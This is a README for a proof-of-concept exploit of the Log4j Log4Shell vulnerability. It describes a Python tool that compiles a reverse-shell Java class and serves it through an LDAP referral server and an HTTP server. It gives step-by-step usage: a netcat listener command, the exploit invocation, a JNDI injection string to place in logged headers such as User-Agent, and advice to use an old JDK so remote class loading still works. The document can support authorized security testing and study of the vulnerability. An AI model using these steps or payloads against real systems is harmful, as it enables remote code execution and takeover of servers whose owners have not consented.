# log4shell-poc (CVE-2021-44228)

Proof-of-concept exploit for the Log4j vulnerability (CVE-2021-44228), also known as Log4Shell. This tool generates a malicious Java class, starts an LDAP referral server, and serves the payload over HTTP, allowing a remote attacker to execute arbitrary commands on a vulnerable target.

## Features

- Automatic detection of the local IPv4 address as the default bind IP.
- Bundled JDK 1.8.0_20 support (recommended) with fallback to system Java.
- Inline reverse shell payload (connects back to a netcat listener).
- Clean compilation and cleanup of generated files.

## Requirements

- Python 3.6 or higher
- The following files/directories must be present in the same folder as `poc.py`:
  - `jdk1.8.0_20/` – a copy of Oracle JDK 1.8.0_20 (contains `bin/javac` and `bin/java`). If missing, the script will attempt to use the system's `javac` and `java` commands.
  - `target/marshalsec-0.0.3-SNAPSHOT-all.jar` – the marshalsec JAR file used to start the LDAP server.

## Installation

1. Clone or download this repository.
2. Place the `jdk1.8.0_20` folder and the `marshalsec` JAR as described above.
3. Install Python dependencies:
   ```
   pip install -r requirements.txt
   ```

## Usage

Run the script with Python:

```
python3 poc.py [OPTIONS]
```

### Command-line arguments

| Argument    | Type    | Default            | Description                                                                                                           |
| ----------- | ------- | ------------------ | --------------------------------------------------------------------------------------------------------------------- |
| `--userip`  | string  | auto-detected IPv4 | IP address that the LDAP and HTTP servers will bind to and advertise. This must be reachable from the target machine. |
| `--webport` | integer | 8000               | Port for the HTTP server that serves the compiled `Exploit.class`.                                                    |
| `--lport`   | integer | 9001               | Port where your netcat listener waits for the reverse shell. The payload will connect back to `userip:lport`.         |

### Example

1. Start a netcat listener on your attacker machine (replace `9001` with your chosen port):

   ```
   nc -lvnp 9001
   ```

2. Run the exploit:

   ```
   python3 poc.py --userip 192.168.1.10 --webport 8080 --lport 9001
   ```

   If you omit `--userip`, the script will automatically use your machine's primary IPv4 address.

3. The script will display a payload string to inject into the vulnerable target, for example:

   ```
   ${jndi:ldap://192.168.1.10:1389/a}
   ```

4. Inject this string into any input field or HTTP header that is logged by a vulnerable Log4j instance (e.g., User-Agent, X-Forwarded-For, etc.). The target will connect to the LDAP server, fetch the malicious class from the HTTP server, and execute the reverse shell.

5. You should see a shell connection appear in your netcat listener.

## How it works

1. The script generates `Exploit.java` containing code that opens a reverse shell to `userip:lport`.
2. It compiles the file using the provided JDK (or system `javac`).
3. It starts an LDAP server (via marshalsec) that responds to JNDI lookups with a reference to the HTTP server.
4. It starts a simple HTTP server on `webport` to host the compiled `Exploit.class`.
5. When a vulnerable target performs a JNDI lookup with the injected payload, it downloads and executes the class, giving the attacker a reverse shell.

## Important notes

- The reverse shell payload uses `/bin/sh` and is intended for Unix-like target systems. For Windows targets, you would need to modify the command inside `Exploit.java`.
- The bundled JDK 1.8.0_20 is recommended because later versions may block the JNDI remote class loading feature used by this exploit.
- Ensure that firewalls allow incoming connections on the specified ports (`webport` and `lport`), and that the target can reach your machine.

## Cleanup

The script automatically removes `Exploit.java` and `Exploit.class` when it exits (either normally or after a KeyboardInterrupt). If you need to keep the files for debugging, comment out the `finally` block in `poc.py`.

## Disclaimer

This tool is intended for educational and authorized security testing purposes only. Unauthorized use of this exploit against systems you do not own or have explicit permission to test is illegal. The authors are not responsible for any misuse or damage caused by this software.

## Credits

- Original PoC by [kozmer](https://github.com/kozmer/log4j-shell-poc)
- Marshalsec by [mbechler](https://github.com/mbechler/marshalsec)
- Log4j vulnerability discovered by the Alibaba Cloud Security Team
